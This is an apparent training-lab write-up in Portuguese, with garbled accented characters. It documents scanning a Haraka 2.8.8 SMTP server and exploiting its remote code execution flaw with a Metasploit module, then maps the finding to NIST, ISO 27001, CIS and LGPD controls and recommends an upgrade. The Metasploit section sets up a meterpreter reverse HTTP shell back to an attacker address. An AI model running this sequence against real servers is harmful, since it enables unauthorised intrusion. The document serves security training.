#+TITLE: Vulnerable SMTP Server: Haraka RCE Exploitation
#+AUTHOR: gabriel
#+DATE: [2026-02-11 qua]
#+OPTIONS: toc:2

* üìò Intro
Este laborat√≥rio foca no processo de fingerprinting e explora√ß√£o de um servidor SMTP vulner√°vel para obten√ß√£o de uma shell reversa. O cen√°rio envolve o uso do framework Metasploit para explorar uma falha de Execu√ß√£o Remota de C√≥digo (RCE) no servi√ßo Haraka.

** Lab Environment
- *Attacker:* Kali Linux (GUI access)
- *Target:* =demo.ine.local= (192.143.119.3)
- *Objective:* Identificar o servi√ßo, vers√£o e obter acesso inicial (Shell).

* üîç Reconnaissance & Fingerprinting
O primeiro passo √© validar a conectividade e identificar as vers√µes exatas dos servi√ßos expostos.

** Target Verification
#+BEGIN_SRC sh
# Validando o arquivo de hosts do sistema
cat /etc/hosts | grep demo
# 192.143.119.3 demo.ine.local
#+END_SRC

** Targeted Nmap Scan
Realizamos um scan focado na porta 25 (SMTP) para detec√ß√£o de vers√£o e vulnerabilidades conhecidas.
#+BEGIN_SRC sh
sudo nmap -sCV -p25 --script vuln -vv demo.ine.local
#+END_SRC

- *Result:* Porta 25 aberta rodando **Haraka smtpd 2.8.8**.
- *Insight:* O script =smtp-vuln-cve2010-4344= descartou a vulnerabilidade do Exim, mas confirmou a vers√£o do Haraka.

* üöÄ Exploit Research & Execution
Com a vers√£o **Haraka 2.8.8** identificada, buscamos por exploits conhecidos.

** Searchsploit Database
#+BEGIN_SRC sh
searchsploit haraka
# Haraka < 2.8.9 - Remote Code Execution (RCE) | linux/remote/41162.rb
#+END_SRC

** Metasploit Exploitation
Utilizamos o m√≥dulo espec√≠fico para explorar o plugin de filtragem de anexos do Haraka.

#+BEGIN_SRC msf
msfconsole -q

# Selecionando o exploit
use exploit/linux/smtp/haraka

# Configura√ß√µes do Alvo
set RHOST demo.ine.local
set EMAIL_TO root@attackdefense.test

# Configura√ß√µes do Payload (Non-Staged para estabilidade)
set PAYLOAD linux/x64/meterpreter_reverse_http
set LHOST 192.164.31.2
set SRVPORT 9898

# Execu√ß√£o
exploit
#+END_SRC

* ‚öñÔ∏è GRC & Audit Perspective (Multi-Framework)
Como analista de seguran√ßa, a presen√ßa de um servi√ßo SMTP desatualizado deve ser reportada sob v√°rias √≥ticas de conformidade:

** üìë NIST SP 800-53 (EUA/Federal)
- *RA-5 Vulnerability Monitoring:* A falha em identificar e mitigar uma vers√£o de software com RCE conhecido (CVE-2016-1000282) viola este controle de monitoramento de vulnerabilidades.
- *SI-2 Flaw Remediation:* Exige a aplica√ß√£o de patches em tempo h√°bil; servidores em vers√£o 2.8.8 (desatualizados) demonstram falha no processo de gest√£o de corre√ß√µes.

** üåç ISO/IEC 27001 (Global/Corporativo)
- *A.8.9 Configuration Management:* A manuten√ß√£o de servi√ßos com configura√ß√µes padr√£o vulner√°veis ou vers√µes obsoletas √© uma n√£o-conformidade direta com o endurecimento de sistemas (Hardening).
- *A.8.19 Information Security during Development:* No contexto de Engenharia de Software, bibliotecas e servi√ßos de terceiros devem ser validados quanto a vulnerabilidades conhecidas antes de entrarem em produ√ß√£o.

** üõ°Ô∏è CIS Controls v8 (Defesa Ativa)
- *Control 7: Vulnerability Management:* Recomenda a corre√ß√£o priorit√°ria de vulnerabilidades com exploits p√∫blicos dispon√≠veis.

** üáßüá∑ LGPD (Privacidade - Brasil)
- *Art. 46 (Seguran√ßa e Sigilo):* Um servidor SMTP vulner√°vel a RCE pode ser usado como ponto de entrada para exfiltra√ß√£o de e-mails contendo dados pessoais, violando o dever de adotar medidas t√©cnicas de seguran√ßa para proteger o sigilo das informa√ß√µes.

* üèÅ Conclusion
A explora√ß√£o bem-sucedida do Haraka 2.8.8 demonstra a import√¢ncia de manter servi√ßos de borda (como SMTP) sempre atualizados. Para remedia√ß√£o, recomenda-se o upgrade imediato para o **Haraka v2.8.9** ou superior.
